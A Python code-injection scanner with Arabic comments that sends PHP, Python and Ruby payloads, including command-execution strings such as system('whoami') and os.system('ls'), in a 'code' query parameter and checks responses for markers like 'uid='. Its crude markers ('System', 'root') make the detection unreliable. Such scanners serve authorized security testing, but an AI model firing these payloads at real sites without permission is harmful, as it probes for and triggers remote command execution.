"""
Code Injection Scanner
يفحص: PHP, Python, Ruby Code Injection
"""

import requests
import urllib.parse
from typing import List, Dict

class CodeInjectionScanner:
    
    def __init__(self, target: str):
        self.target = target
        self.vulnerabilities = []
        
        # Payloads
        self.payloads = {
            'php': [
                "phpinfo();",
                "system('whoami');",
                "echo md5(123);",
                "${@print(md5(123))}",
                "<?php phpinfo(); ?>"
            ],
            'python': [
                "__import__('os').system('whoami')",
                "exec('import os; os.system(\"ls\")')",
                "eval('1+1')"
            ],
            'ruby': [
                "system('whoami')",
                "`whoami`",
                "eval('1+1')"
            ]
        }
    
    def scan(self) -> List[Dict]:
        """الفحص الرئيسي"""
        print(f"[+] فحص Code Injection: {self.target}")
        
        for lang, payloads in self.payloads.items():
            for payload in payloads:
                try:
                    url = f"{self.target}?code={urllib.parse.quote(payload)}"
                    response = requests.get(url, timeout=10)
                    
                    if self._check_code_injection(response, lang):
                        self.vulnerabilities.append({
                            'type': f'Code Injection ({lang.upper()})',
                            'severity': 'critical',
                            'url': url,
                            'payload': payload,
                            'evidence': response.text[:300]
                        })
                        print(f"  [!] {lang.upper()} Code Injection وُجدت!")
                        return self.vulnerabilities
                except:
                    pass
        
        return self.vulnerabilities
    
    def _check_code_injection(self, response, lang: str) -> bool:
        """فحص نجاح Code Injection"""
        indicators = {
            'php': ['phpinfo', 'PHP Version', 'System', 'Configuration', 'root', 'uid='],
            'python': ['Traceback', 'NameError', 'SyntaxError', 'root', 'uid='],
            'ruby': ['ruby', 'Traceback', 'root', 'uid=']
        }
        
        text = response.text
        return any(ind in text for ind in indicators.get(lang, []))
